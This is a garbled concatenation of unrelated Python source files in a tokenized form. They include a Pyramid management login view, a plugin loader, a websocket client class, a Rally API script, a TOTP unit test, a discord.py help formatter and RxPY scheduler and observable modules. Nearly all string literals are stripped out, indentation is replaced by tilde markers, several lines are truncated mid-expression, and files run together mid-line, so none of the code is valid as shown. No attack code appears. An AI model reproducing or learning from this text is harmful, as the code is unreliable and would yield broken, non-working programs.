renderer = , \n 
tab_condition = False , \n 
permission = NO_PERMISSION_REQUIRED \n 
) \n 
@ mgmt_view ( \n 
renderer = , \n 
context = HTTPForbidden , \n 
permission = NO_PERMISSION_REQUIRED , \n 
tab_condition = False \n 
) \n 
@ mgmt_view ( \n 
renderer = , \n 
context = HTTPForbidden , \n 
permission = NO_PERMISSION_REQUIRED , \n 
effective_principals = Authenticated , \n 
tab_condition = False \n 
) \n 
def login ( context , request ) : \n 
~~~ login_url = request . sdiapi . mgmt_path ( request . context , ) \n 
referrer = request . url \n 
if in referrer : \n 
\n 
# auditstream sse view, bail.  Otherwise the came_from will be set to \n 
# the auditstream URL, and the user who this happens to will eventually \n 
\n 
# they see e.g. "id: 0-10\\ndata: " when they log in successfully. \n 
~~~ return HTTPForbidden ( ) \n 
~~ if login_url in referrer : \n 
# never use the login form itself as came_from \n 
~~~ referrer = request . sdiapi . mgmt_path ( request . virtual_root ) \n 
~~ came_from = request . session . setdefault ( , referrer ) \n 
login = \n 
password = \n 
if in request . params : \n 
~~~ try : \n 
~~~ check_csrf_token ( request ) \n 
~~ except : \n 
~~~ request . sdiapi . flash ( , ) \n 
~~ else : \n 
~~~ login = request . params [ ] \n 
password = request . params [ ] \n 
adapter = request . registry . queryMultiAdapter ( \n 
( context , request ) , \n 
IUserLocator \n 
) \n 
if adapter is None : \n 
~~~ adapter = DefaultUserLocator ( context , request ) \n 
~~ user = adapter . get_user_by_login ( login ) \n 
if user is not None and user . check_password ( password ) : \n 
~~~ request . session . pop ( , None ) \n 
headers = remember ( request , get_oid ( user ) ) \n 
request . registry . notify ( LoggedIn ( login , user , context , request ) ) \n 
return HTTPFound ( location = came_from , headers = headers ) \n 
~~ request . sdiapi . flash ( , ) \n 
\n 
# Pass this through FBO views (e.g., forbidden) which use its macros. \n 
~~ ~~ template = get_renderer ( \n 
) . implementation ( ) \n 
return dict ( \n 
url = request . sdiapi . mgmt_path ( request . virtual_root , ) , \n 
came_from = came_from , \n 
login = login , \n 
password = password , \n 
login_template = template , \n 
) \n 
\n 
~~ @ mgmt_view ( \n 
name = , \n 
tab_condition = False , \n 
permission = NO_PERMISSION_REQUIRED \n 
) \n 
def logout ( request ) : \n 
~~~ headers = forget ( request ) \n 
return HTTPFound ( location = request . sdiapi . mgmt_path ( request . context ) , \n 
headers = headers ) \n 
~~ import fnmatch \n 
import os \n 
import os . path \n 
import re \n 
import sys \n 
try : \n 
~~~ import json \n 
~~ except : \n 
~~~ import simplejson as json \n 
\n 
\n 
~~ def dump_sorted_json_string ( input , ** kwargs ) : \n 
~~~ """\n    Given a datastructure, return a JSON formatted string of it with\n    all dictionary keys sorted.\n\n    * `input` - arbitrary Python datastructure\n\n    * `**kwargs` - Arbitrary keyword arguments to pass to the\n      `json.dumps` method. For example, you might want to pass a\n      custom :py:class:`json.JSONEncoder` class. See the docs for a\n      complete list of the available parameters.\n\n    * `json.dumps` docs - http://docs.python.org/2.7/library/json.html#json.dumps\n    """ \n 
return json . dumps ( input , sort_keys = True , separators = ( , ) , ** kwargs ) \n 
\n 
\n 
~~ def load_extra_plugins ( pathspec ) : \n 
~~~ """\n    Load extra fact plugins from a user specified directory\n\n    `pathspec` - A string of either: a single directory path, or a\n    compound (colon separated) list of paths\n    """ \n 
# Collect names of loaded plugins so we have something to test \n 
# success/failure against \n 
loaded_plugins = [ ] \n 
\n 
paths = pathspec . split ( ) \n 
for path in paths : \n 
~~~ loaded_plugins . extend ( _load_plugins_from_dir ( path ) ) \n 
\n 
~~ return loaded_plugins \n 
\n 
\n 
~~ def _load_plugins_from_dir ( path ) : \n 
~~~ """\n    Load plugins from a given path\n    """ \n 
plugins = [ ] \n 
loaded_plugins = [ ] \n 
\n 
\n 
full_path = os . path . expanduser ( path ) \n 
\n 
# Check if the dir exists, by asking for forgiveness \n 
try : \n 
~~~ filtered = fnmatch . filter ( os . listdir ( path ) , ) \n 
plugins . extend ( filtered ) \n 
~~ except OSError : \n 
\n 
~~~ pass \n 
~~ else : \n 
# We read in the plugin dir, so lets add it to the load path \n 
~~~ sys . path . insert ( 1 , path ) \n 
\n 
# Import the thing(s) \n 
~~ for plugin in plugins : \n 
~~~ match = re . search ( , plugin ) \n 
if match : \n 
~~~ try : \n 
~~~ __import__ ( match . group ( ) , globals ( ) , locals ( ) , [ ] , - 1 ) \n 
~~ except : \n 
~~~ pass \n 
~~ else : \n 
~~~ loaded_plugins . append ( match . group ( ) ) \n 
~~ ~~ ~~ return loaded_plugins \n 
~~ __author__ = \n 
\n 
import websocket \n 
import threading \n 
import struct \n 
\n 
class Session ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . running = False \n 
\n 
self . thread = None \n 
self . ws = None \n 
\n 
self . host = \n 
self . port = 443 \n 
\n 
self . inbound = [ ] \n 
\n 
~~ def connect ( self , host , port ) : \n 
~~~ if not self . is_connected ( ) : \n 
~~~ if type ( port ) == int : \n 
~~~ port = str ( port ) \n 
\n 
~~ url = + host + + port + \n 
try : \n 
~~~ self . ws = websocket . WebSocket ( ) \n 
self . ws . connect ( url , origin = ) \n 
\n 
# if we got here, we connected! \n 
self . running = True \n 
\n 
self . inbound = [ ] \n 
\n 
self . thread = threading . Thread ( name = , target = self . run ) \n 
self . thread . start ( ) \n 
return True \n 
~~ except Exception as ex : \n 
~~~ print ( + url ) \n 
# raise ex \n 
~~ ~~ return False \n 
\n 
~~ def disconnect ( self ) : \n 
~~~ if self . is_connected ( ) : \n 
~~~ self . running = False \n 
self . thread = None \n 
try : \n 
~~~ if self . ws . connected : \n 
~~~ self . ws . close ( ) \n 
~~ ~~ except : \n 
~~~ pass \n 
~~ return True \n 
~~ return False \n 
\n 
~~ def is_connected ( self ) : \n 
~~~ return self . running and self . ws . connected \n 
\n 
~~ def run ( self ) : \n 
~~~ while self . is_connected ( ) and self . thread == threading . current_thread ( ) : \n 
~~~ try : \n 
~~~ if self . ws . connected : \n 
~~~ data = self . ws . recv ( ) \n 
self . inbound . append ( data ) \n 
~~ ~~ except Exception as ex : \n 
~~~ print ( + str ( self . ws . connected ) + + str ( ex ) ) \n 
return \n 
\n 
~~ ~~ ~~ def read ( self ) : \n 
~~~ if self . is_connected ( ) : \n 
~~~ if len ( self . inbound ) > 0 : \n 
~~~ data = self . inbound [ 0 ] \n 
self . inbound = self . inbound [ 1 : ] \n 
return data \n 
~~ ~~ return None \n 
\n 
~~ def write ( self , data ) : \n 
~~~ if self . is_connected ( ) : \n 
~~~ if type ( data ) == bytearray : \n 
~~~ data = bytes ( data ) # no reason to do this \n 
\n 
~~ if len ( data ) > 0 : \n 
~~~ try : \n 
~~~ self . ws . send ( data ) \n 
return True \n 
~~ except Exception as ex : \n 
~~~ print ( + str ( ex ) ) \n 
~~ ~~ ~~ return False \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ ses = Session ( ) \n 
ses . connect ( , 443 ) #!/usr/bin/env python \n 
\n 
################################################################################################# \n 
# \n 
# typedef.py --  obtain the attribute info for a user specified entity along with the full \n 
#                inheritance chain \n 
# \n 
~~ USAGE = """\nUsage:  typedef.py <entity_name>\n""" \n 
################################################################################################# \n 
\n 
import sys \n 
import re \n 
\n 
from pyral import Rally , rallyWorkset \n 
\n 
################################################################################################# \n 
\n 
errout = sys . stderr . write \n 
\n 
ATTRIBUTE_FIELDS = """\n     ObjectID\n     _ref\n     _type\n     _refObjectName\n     _objectVersion\n     _CreatedAt\n     CreationDate\n     Subscription\n     Workspace\n     ElementName\n     Parent\n     TypePath\n     Name \n     IDPrefix\n     AttributeType\n     SchemaType\n     Required\n     ReadOnly\n     Custom\n     Hidden\n     MaxLength\n     MaxFractionalDigits\n     Constrained\n     Filterable\n     Owned\n     AllowedValueType\n     AllowedValues\n     AllowedQueryOperators\n     Note \n    """ . split ( "\\n" ) \n 
\n 
################################################################################################# \n 
\n 
def main ( args ) : \n 
\n 
~~~ options = [ opt for opt in args if opt . startswith ( ) ] \n 
args = [ arg for arg in args if arg not in options ] \n 
if not args : \n 
~~~ print "You must supply an entity name!" \n 
sys . exit ( 1 ) \n 
\n 
~~ query = "" \n 
target = args [ 0 ] \n 
if target in [ , , ] : \n 
~~~ target = "HierarchicalRequirement" \n 
~~ if in target : \n 
~~~ parent , entity = target . split ( , 1 ) \n 
target = entity \n 
~~ query = \'ElementName = "%s"\' % target \n 
\n 
server , username , password , apikey , workspace , project = rallyWorkset ( options ) \n 
try : \n 
~~~ if apikey : \n 
~~~ rally = Rally ( server , apikey = apikey , workspace = workspace , project = project ) \n 
~~ else : \n 
~~~ rally = Rally ( server , user = username , password = password , workspace = workspace , project = project ~~ ~~ except Exception as ex : \n 
~~~ errout ( str ( ex . args [ 0 ] ) ) \n 
sys . exit ( 1 ) \n 
\n 
~~ typedef = rally . typedef ( target ) \n 
showAttributes ( typedef . Attributes ) \n 
\n 
print "" \n 
print "-" * 64 \n 
print "" \n 
for ix , ancestor in enumerate ( typedef . inheritanceChain ( ) ) : \n 
~~~ print "%s %s" % ( " " * ( ix * 4 ) , ancestor ) \n 
\n 
################################################################################################# \n 
\n 
~~ ~~ def showAttributes ( attributes ) : \n 
~~~ required = [ ] \n 
optional = [ ] \n 
av_limit = 20 \n 
\n 
for attr in attributes : \n 
~~~ name = % attr . ElementName \n 
a_type = % attr . AttributeType \n 
s_type = % attr . SchemaType \n 
s_type = s_type . replace ( , ) \n 
if s_type . upper ( ) == a_type : \n 
~~~ s_type = \n 
~~ reqd = if attr . Required else \n 
rdonly = if attr . ReadOnly else \n 
custom = if attr . Custom else \n 
hidden = if attr . Hidden else \n 
allowedValues = attr . AllowedValues \n 
tank = required if reqd == else optional \n 
num_allowed_values = "" \n 
if len ( allowedValues ) > 0 : \n 
~~~ num_allowed_values = ( "%d allowed values" % len ( allowedValues ) ) \n 
if len ( allowedValues ) == 1 : \n 
~~~ num_allowed_values = num_allowed_values [ : - 1 ] \n 
\n 
~~ ~~ info = "%-32.32s  %-10.10s  %-16.16s  %-10.10s  %-8.8s  %-8.8s  %-7.7s" % ( name , a_type , s_type , reqd , rdonly , custom , hidden ) \n 
tank . append ( info ) \n 
if num_allowed_values : \n 
~~~ tank . append ( "  %s" % num_allowed_values ) \n 
\n 
~~ for av in allowedValues [ : av_limit ] : \n 
~~~ av_info = "    |%s|" % av . StringValue \n 
tank . append ( av_info ) \n 
~~ if len ( allowedValues ) > av_limit : \n 
~~~ tank . append ( "     ...  %d more values not shown" % ( len ( allowedValues ) - av_limit ) ) \n 
\n 
~~ ~~ for item in required + optional : \n 
~~~ print item . encode ( ) \n 
\n 
################################################################################################# \n 
################################################################################################# \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ main ( sys . argv [ 1 : ] ) \n 
~~ import unittest \n 
import binascii \n 
import struct \n 
import yubi_goog \n 
\n 
class TestYubiGoog ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . google_secret = "n xu7 v4s qp6 njs gj5" \n 
self . test_secret = binascii . hexlify ( . encode ( ) ) \n 
self . test_vectors = [ { : 1111111111 , : } , \n 
{ : 1234567890 , : } , \n 
{ : 2000000000 , : } ] \n 
\n 
~~ def test_decode_secret ( self ) : \n 
~~~ decoded = yubi_goog . decode_secret ( self . google_secret ) . upper ( ) \n 
self . assertEqual ( decoded , "6DE9FAF2507F9A99193D" . encode ( ) ) \n 
\n 
~~ def test_totp ( self ) : \n 
~~~ for pair in self . test_vectors : \n 
~~~ time = pair [ ] \n 
real_otp = pair [ ] \n 
\n 
tm = int ( int ( time ) / 30 ) \n 
tm = struct . pack ( , tm ) \n 
otp = yubi_goog . totp ( self . test_secret , tm ) \n 
self . assertEqual ( otp , real_otp ) \n 
\n 
~~ ~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ """\nThe MIT License (MIT)\n\nCopyright (c) 2015-2016 Rapptz\n\nPermission is hereby granted, free of charge, to any person obtaining a\ncopy of this software and associated documentation files (the "Software"),\nto deal in the Software without restriction, including without limitation\nthe rights to use, copy, modify, merge, publish, distribute, sublicense,\nand/or sell copies of the Software, and to permit persons to whom the\nSoftware is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS\nOR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\nFROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\nDEALINGS IN THE SOFTWARE.\n""" \n 
\n 
import itertools \n 
import inspect \n 
\n 
from . core import GroupMixin , Command \n 
from . errors import CommandError \n 
\n 
# help -> shows info of bot on top/bottom and lists subcommands \n 
# help command -> shows detailed info of command \n 
# help command <subcommand chain> -> same as above \n 
\n 
# <description> \n 
\n 
# <command signature with aliases> \n 
\n 
# <long doc> \n 
\n 
# Cog: \n 
#   <command> <shortdoc> \n 
#   <command> <shortdoc> \n 
# Other Cog: \n 
#   <command> <shortdoc> \n 
# No Category: \n 
#   <command> <shortdoc> \n 
\n 
# Type <prefix>help command for more info on a command. \n 
# You can also type <prefix>help category for more info on a category. \n 
\n 
\n 
class HelpFormatter : \n 
~~~ """The default base implementation that handles formatting of the help\n    command.\n\n    To override the behaviour of the formatter, :meth:`format`\n    should be overridden. A number of utility functions are provided for use\n    inside that method.\n\n    Parameters\n    -----------\n    show_hidden : bool\n        Dictates if hidden commands should be shown in the output.\n        Defaults to ``False``.\n    show_check_failure : bool\n        Dictates if commands that have their :attr:`Command.checks` failed\n        shown. Defaults to ``False``.\n    width : int\n        The maximum number of characters that fit in a line.\n        Defaults to 80.\n    """ \n 
def __init__ ( self , show_hidden = False , show_check_failure = False , width = 80 ) : \n 
~~~ self . width = width \n 
self . show_hidden = show_hidden \n 
self . show_check_failure = show_check_failure \n 
\n 
~~ def has_subcommands ( self ) : \n 
~~~ """bool : Specifies if the command has subcommands.""" \n 
return isinstance ( self . command , GroupMixin ) \n 
\n 
~~ def is_bot ( self ) : \n 
~~~ """bool : Specifies if the command being formatted is the bot itself.""" \n 
return self . command is self . context . bot \n 
\n 
~~ def is_cog ( self ) : \n 
~~~ """bool : Specifies if the command being formatted is actually a cog.""" \n 
return not self . is_bot ( ) and not isinstance ( self . command , Command ) \n 
\n 
~~ def shorten ( self , text ) : \n 
~~~ """Shortens text to fit into the :attr:`width`.""" \n 
if len ( text ) > self . width : \n 
~~~ return text [ : self . width - 3 ] + \n 
~~ return text \n 
\n 
~~ @ property \n 
def max_name_size ( self ) : \n 
~~~ """int : Returns the largest name length of a command or if it has subcommands\n        the largest subcommand name.""" \n 
try : \n 
~~~ commands = self . command . commands if not self . is_cog ( ) else self . context . bot . commands \n 
if commands : \n 
~~~ return max ( map ( lambda c : len ( c . name ) , commands . values ( ) ) ) \n 
~~ return 0 \n 
~~ except AttributeError : \n 
~~~ return len ( self . command . name ) \n 
\n 
~~ ~~ @ property \n 
def clean_prefix ( self ) : \n 
~~~ """The cleaned up invoke prefix. i.e. mentions are ``@name`` instead of ``<@id>``.""" \n 
user = self . context . bot . user \n 
# this breaks if the prefix mention is not the bot itself but I \n 
\n 
# for this common use case rather than waste performance for the \n 
# odd one. \n 
return self . context . prefix . replace ( user . mention , + user . name ) \n 
\n 
~~ def get_qualified_command_name ( self ) : \n 
~~~ """Retrieves the fully qualified command name, i.e. the base command name\n        required to execute it. This does not contain the command name itself.\n        """ \n 
entries = [ ] \n 
command = self . command \n 
while command . parent is not None : \n 
~~~ command = command . parent \n 
entries . append ( command . name ) \n 
\n 
~~ return . join ( reversed ( entries ) ) \n 
\n 
~~ def get_command_signature ( self ) : \n 
~~~ """Retrieves the signature portion of the help page.""" \n 
result = [ ] \n 
prefix = self . clean_prefix \n 
qualified = self . get_qualified_command_name ( ) \n 
cmd = self . command \n 
if len ( cmd . aliases ) > 0 : \n 
~~~ aliases = . join ( cmd . aliases ) \n 
fmt = \n 
if qualified : \n 
~~~ fmt = \n 
~~ result . append ( fmt . format ( prefix , cmd , aliases , qualified ) ) \n 
~~ else : \n 
~~~ name = prefix + cmd . name if not qualified else prefix + qualified + + cmd . name \n 
result . append ( name ) \n 
\n 
~~ params = cmd . clean_params \n 
if len ( params ) > 0 : \n 
~~~ for name , param in params . items ( ) : \n 
~~~ if param . default is not param . empty : \n 
# do [name] since [name=None] or [name=] are not exactly useful for the user. \n 
~~~ should_print = param . default if isinstance ( param . default , str ) else param . default if should_print : \n 
~~~ result . append ( . format ( name , param . default ) ) \n 
~~ else : \n 
~~~ result . append ( . format ( name ) ) \n 
~~ ~~ elif param . kind == param . VAR_POSITIONAL : \n 
~~~ result . append ( . format ( name ) ) \n 
~~ else : \n 
~~~ result . append ( . format ( name ) ) \n 
\n 
~~ ~~ ~~ return . join ( result ) \n 
\n 
~~ def get_ending_note ( self ) : \n 
~~~ command_name = self . context . invoked_with \n 
return "Type {0}{1} command for more info on a command.\\n" "You can also type {0}{1} category for more info on a category." . format ( self . clean_prefix \n 
~~ def filter_command_list ( self ) : \n 
~~~ """Returns a filtered list of commands based on the two attributes\n        provided, :attr:`show_check_failure` and :attr:`show_hidden`. Also\n        filters based on if :meth:`is_cog` is valid.\n\n        Returns\n        --------\n        iterable\n            An iterable with the filter being applied. The resulting value is\n            a (key, value) tuple of the command name and the command itself.\n        """ \n 
def predicate ( tuple ) : \n 
~~~ cmd = tuple [ 1 ] \n 
if self . is_cog ( ) : \n 
\n 
~~~ if cmd . instance is not self . command : \n 
~~~ return False \n 
\n 
~~ ~~ if cmd . hidden and not self . show_hidden : \n 
~~~ return False \n 
\n 
~~ if self . show_check_failure : \n 
\n 
# care about them, so just return true. \n 
~~~ return True \n 
\n 
~~ try : \n 
~~~ return cmd . can_run ( self . context ) \n 
~~ except CommandError : \n 
~~~ return False \n 
\n 
~~ ~~ iterator = self . command . commands . items ( ) if not self . is_cog ( ) else self . context . bot . commands return filter ( predicate , iterator ) \n 
\n 
~~ def _check_new_page ( self ) : \n 
# be a little on the safe side \n 
\n 
~~~ if self . _count + len ( self . _current_page ) >= 1980 : \n 
# add the page \n 
~~~ self . _current_page . append ( ) \n 
self . _pages . append ( . join ( self . _current_page ) ) \n 
self . _current_page = [ ] \n 
self . _count = 4 \n 
return True \n 
~~ return False \n 
\n 
~~ def _add_subcommands_to_page ( self , max_width , commands ) : \n 
~~~ for name , command in commands : \n 
~~~ if name in command . aliases : \n 
# skip aliases \n 
~~~ continue \n 
\n 
~~ entry = . format ( name , command . short_doc , width = max_width ) \n 
shortened = self . shorten ( entry ) \n 
self . _count += len ( shortened ) \n 
if self . _check_new_page ( ) : \n 
~~~ self . _count += len ( shortened ) \n 
~~ self . _current_page . append ( shortened ) \n 
\n 
~~ ~~ def format_help_for ( self , context , command_or_bot ) : \n 
~~~ """Formats the help page and handles the actual heavy lifting of how\n        the help command looks like. To change the behaviour, override the\n        :meth:`format` method.\n\n        Parameters\n        -----------\n        context : :class:`Context`\n            The context of the invoked help command.\n        command_or_bot : :class:`Command` or :class:`Bot`\n            The bot or command that we are getting the help of.\n\n        Returns\n        --------\n        list\n            A paginated output of the help command.\n        """ \n 
self . context = context \n 
self . command = command_or_bot \n 
return self . format ( ) \n 
\n 
~~ def format ( self ) : \n 
~~~ """Handles the actual behaviour involved with formatting.\n\n        To change the behaviour, this method should be overridden.\n\n        Returns\n        --------\n        list\n            A paginated output of the help command.\n        """ \n 
self . _pages = [ ] \n 
self . _count = 4 \n 
self . _current_page = [ ] \n 
\n 
# we need a padding of ~80 or so \n 
\n 
description = self . command . description if not self . is_cog ( ) else inspect . getdoc ( self . command \n 
if description : \n 
# <description> portion \n 
~~~ self . _current_page . append ( description ) \n 
self . _current_page . append ( ) \n 
self . _count += len ( description ) \n 
\n 
~~ if isinstance ( self . command , Command ) : \n 
# <signature portion> \n 
~~~ signature = self . get_command_signature ( ) \n 
self . _count += 2 + len ( signature ) \n 
self . _current_page . append ( signature ) \n 
self . _current_page . append ( ) \n 
\n 
# <long doc> section \n 
if self . command . help : \n 
~~~ self . _count += 2 + len ( self . command . help ) \n 
self . _current_page . append ( self . command . help ) \n 
self . _current_page . append ( ) \n 
self . _check_new_page ( ) \n 
\n 
\n 
~~ if not self . has_subcommands ( ) : \n 
~~~ self . _current_page . append ( ) \n 
self . _pages . append ( . join ( self . _current_page ) ) \n 
return self . _pages \n 
\n 
\n 
~~ ~~ max_width = self . max_name_size \n 
\n 
def category ( tup ) : \n 
~~~ cog = tup [ 1 ] . cog_name \n 
# we insert the zero width space there to give it approximate \n 
# last place sorting position. \n 
return cog + if cog is not None else \n 
\n 
~~ if self . is_bot ( ) : \n 
~~~ data = sorted ( self . filter_command_list ( ) , key = category ) \n 
for category , commands in itertools . groupby ( data , key = category ) : \n 
# there simply is no prettier way of doing this. \n 
~~~ commands = list ( commands ) \n 
if len ( commands ) > 0 : \n 
~~~ self . _current_page . append ( category ) \n 
self . _count += len ( category ) \n 
self . _check_new_page ( ) \n 
\n 
~~ self . _add_subcommands_to_page ( max_width , commands ) \n 
~~ ~~ else : \n 
~~~ self . _current_page . append ( ) \n 
self . _count += 1 + len ( self . _current_page [ - 1 ] ) \n 
self . _add_subcommands_to_page ( max_width , self . filter_command_list ( ) ) \n 
\n 
# add the ending note \n 
~~ self . _current_page . append ( ) \n 
ending_note = self . get_ending_note ( ) \n 
self . _count += len ( ending_note ) \n 
self . _check_new_page ( ) \n 
self . _current_page . append ( ending_note ) \n 
\n 
if len ( self . _current_page ) > 1 : \n 
~~~ self . _current_page . append ( ) \n 
self . _pages . append ( . join ( self . _current_page ) ) \n 
\n 
~~ return self . _pages \n 
~~ ~~ from rx . disposables import Disposable , SingleAssignmentDisposable \n 
\n 
from . scheduler import Scheduler \n 
\n 
\n 
class CatchScheduler ( Scheduler ) : \n 
~~~ def __init__ ( self , scheduler , handler ) : \n 
~~~ self . _scheduler = scheduler \n 
self . _handler = handler \n 
self . _recursive_original = None \n 
self . _recursive_wrapper = None \n 
\n 
super ( CatchScheduler , self ) . __init__ ( ) \n 
\n 
~~ def local_now ( self ) : \n 
~~~ return self . _scheduler . now ( ) \n 
\n 
~~ def schedule_now ( self , state , action ) : \n 
~~~ """Schedules an action to be executed.""" \n 
\n 
return self . _scheduler . scheduleWithState ( state , self . _wrap ( action ) ) \n 
\n 
~~ def schedule_relative ( self , duetime , action , state = None ) : \n 
~~~ """Schedules an action to be executed after duetime.""" \n 
\n 
return self . _scheduler . schedule_relative ( duetime , self . _wrap ( action ) , \n 
state = state ) \n 
\n 
~~ def schedule_absolute ( self , duetime , action , state = None ) : \n 
~~~ """Schedules an action to be executed at duetime.""" \n 
\n 
return self . _scheduler . schedule_absolute ( duetime , self . _wrap ( action ) , \n 
state = state ) \n 
\n 
~~ def _clone ( self , scheduler ) : \n 
~~~ return CatchScheduler ( scheduler , self . _handler ) \n 
\n 
~~ def _wrap ( self , action ) : \n 
~~~ parent = self \n 
\n 
def wrapped_action ( self , state ) : \n 
~~~ try : \n 
~~~ return action ( parent . _get_recursive_wrapper ( self ) , state ) \n 
~~ except Exception as ex : \n 
~~~ if not parent . _handler ( ex ) : \n 
~~~ raise Exception ( ex ) \n 
~~ return Disposable . empty ( ) \n 
~~ ~~ return wrapped_action \n 
\n 
~~ def _get_recursive_wrapper ( self , scheduler ) : \n 
~~~ if self . _recursive_original != scheduler : \n 
~~~ self . _recursive_original = scheduler \n 
wrapper = self . _clone ( scheduler ) \n 
wrapper . _recursive_original = scheduler \n 
wrapper . _recursive_wrapper = wrapper \n 
self . _recursive_wrapper = wrapper \n 
\n 
~~ return self . _recursive_wrapper \n 
\n 
~~ def schedule_periodic ( self , period , action , state = None ) : \n 
~~~ d = SingleAssignmentDisposable ( ) \n 
failed = [ False ] \n 
\n 
def periodic_action ( periodic_state ) : \n 
~~~ if failed [ 0 ] : \n 
~~~ return None \n 
~~ try : \n 
~~~ return action ( periodic_state ) \n 
~~ except Exception as ex : \n 
~~~ failed [ 0 ] = True \n 
if not self . _handler ( ex ) : \n 
~~~ raise Exception ( ex ) \n 
~~ d . dispose ( ) \n 
return None \n 
\n 
~~ ~~ d . disposable = self . _scheduler . schedule_periodic ( periodic_action , \n 
period , state ) \n 
return d \n 
~~ ~~ from . booleandisposable import BooleanDisposable \n 
\n 
\n 
class SingleAssignmentDisposable ( BooleanDisposable ) : \n 
~~~ """Represents a disposable resource which only allows a single assignment \n    of its underlying disposable resource. If an underlying disposable resource\n    has already been set, future attempts to set the underlying disposable\n    resource will throw an Error.""" \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( SingleAssignmentDisposable , self ) . __init__ ( True ) \n 
~~ ~~ import threading \n 
\n 
from rx . blockingobservable import BlockingObservable \n 
from rx . internal import extensionmethod \n 
from rx . internal . enumerator import Enumerator \n 
\n 
\n 
@ extensionmethod ( BlockingObservable ) \n 
def to_iterable ( self ) : \n 
~~~ """Returns an iterator that can iterate over items emitted by this\n    `BlockingObservable`.\n\n    :returns: An iterator that can iterate over the items emitted by this\n        `BlockingObservable`.\n    :rtype: Iterable[Any]\n    """ \n 
\n 
condition = threading . Condition ( ) \n 
notifications = [ ] \n 
\n 
def on_next ( value ) : \n 
~~~ """Takes on_next values and appends them to the notification queue""" \n 
\n 
condition . acquire ( ) \n 
notifications . append ( value ) \n 
condition . notify ( ) # signal that a new item is available \n 
condition . release ( ) \n 
\n 
~~ self . observable . materialize ( ) . subscribe ( on_next ) \n 
\n 
def gen ( ) : \n 
~~~ """Generator producing values for the iterator""" \n 
\n 
while True : \n 
~~~ condition . acquire ( ) \n 
while not len ( notifications ) : \n 
~~~ condition . wait ( ) \n 
~~ notification = notifications . pop ( 0 ) \n 
\n 
if notification . kind == "E" : \n 
~~~ raise notification . exception \n 
\n 
~~ if notification . kind == "C" : \n 
~~~ return # StopIteration \n 
\n 
~~ condition . release ( ) \n 
yield notification . value \n 
\n 
~~ ~~ return Enumerator ( gen ( ) ) \n 
\n 
\n 
~~ @ extensionmethod ( BlockingObservable ) \n 
def __iter__ ( self ) : \n 
~~~ """Returns an iterator that can iterate over items emitted by this\n    `BlockingObservable`.\n\n    :param BlockingObservable self: Blocking observable instance.\n    :returns: An iterator that can iterate over the items emitted by this\n        `BlockingObservable`.\n    :rtype: Iterable[Any]\n    """ \n 
\n 
return self . to_iterable ( ) \n 
~~ from rx . observable import Observable \n 
from rx . anonymousobservable import AnonymousObservable \n 
from rx . internal import extensionmethod \n 
\n 
\n 
def find_value ( source , predicate , yield_index ) : \n 
~~~ def subscribe ( observer ) : \n 
~~~ i = [ 0 ] \n 
\n 
def on_next ( x ) : \n 
~~~ should_run = False \n 
try : \n 
~~~ should_run = predicate ( x , i , source ) \n 
~~ except Exception as ex : \n 
~~~ observer . on_error ( ex ) \n 
return \n 
\n 
~~ if should_run : \n 
~~~ observer . on_next ( i [ 0 ] if yield_index else x ) \n 
observer . on_completed ( ) \n 
~~ else : \n 
~~~ i [ 0 ] += 1 \n 
\n 
~~ ~~ def on_completed ( ) : \n 
~~~ observer . on_next ( - 1 if yield_index else None ) \n 
observer . on_completed ( ) \n 
\n 
~~ return source . subscribe ( on_next , observer . on_error , on_completed ) \n 
~~ return AnonymousObservable ( subscribe ) \n 
\n 
~~ @ extensionmethod ( Observable ) \n 
def find ( self , predicate ) : \n 
~~~ """Searches for an element that matches the conditions defined by the\n    specified predicate, and returns the first occurrence within the entire\n    Observable sequence.\n\n    Keyword arguments:\n    predicate -- {Function} The predicate that defines the conditions of the\n        element to search for.\n\n    Returns an Observable {Observable} sequence with the first element that\n    matches the conditions defined by the specified predicate, if found\n    otherwise, None.\n    """ \n 
\n 
return find_value ( self , predicate , False ) \n 
~~ from rx import Observable , AnonymousObservable \n 
from rx . linq . connectableobservable import ConnectableObservable \n 
from rx . disposables import CompositeDisposable \n 
from rx . internal import extensionmethod \n 
\n 
\n 
@ extensionmethod ( Observable ) \n 
def multicast ( self , subject = None , subject_selector = None , selector = None ) : \n 
~~~ """Multicasts the source sequence notifications through an instantiated\n    subject into all uses of the sequence within a selector function. Each\n    subscription to the resulting sequence causes a separate multicast\n    invocation, exposing the sequence resulting from the selector function\'s\n    invocation. For specializations with fixed subject types, see Publish,\n    PublishLast, and Replay.\n\n    Example:\n    1 - res = source.multicast(observable)\n    2 - res = source.multicast(subject_selector=lambda: Subject(),\n                               selector=lambda x: x)\n\n    Keyword arguments:\n    subject_selector -- {Function} Factory function to create an\n        intermediate subject through which the source sequence\'s elements\n        will be multicast to the selector function.\n    subject -- Subject {Subject} to push source elements into.\n    selector -- {Function} [Optional] Optional selector function which can\n        use the multicasted source sequence subject to the policies enforced\n        by the created subject. Specified only if subject_selector" is a\n        factory function.\n\n    Returns an observable {Observable} sequence that contains the elements\n    of a sequence produced by multicasting the source sequence within a\n    selector function.\n    """ \n 
\n 
source = self \n 
if subject_selector : \n 
~~~ def subscribe ( observer ) : \n 
~~~ connectable = source . multicast ( subject = subject_selector ( ) ) \n 
return CompositeDisposable ( selector ( connectable ) . subscribe ( observer ) , connectable . connect \n 
~~ return AnonymousObservable ( subscribe ) \n 
~~ else : \n 
~~~ return ConnectableObservable ( source , subject ) \n 
~~ ~~ from datetime import datetime \n 
\n 
from rx . observable import Observable \n 
from rx . anonymousobservable import AnonymousObservable \n 
from rx . disposables import CompositeDisposable \n 
